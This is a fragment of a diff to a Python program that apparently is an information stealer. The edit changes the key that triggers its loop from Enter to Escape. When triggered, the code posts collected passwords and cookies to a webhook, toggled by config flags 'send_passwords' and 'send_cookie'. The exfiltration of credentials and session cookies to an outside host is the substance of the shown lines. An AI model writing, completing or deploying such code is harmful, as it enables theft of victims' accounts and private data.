@@ -85,7 +85,7 @@ class Main:
         
         while True:
             try:
-                if keyboard.is_pressed('enter'):                    
+                if keyboard.is_pressed('esc'):                    
                     if config.send_passwords:
                         requests.post(webhook,json=payload1)
                     if config.send_cookie:
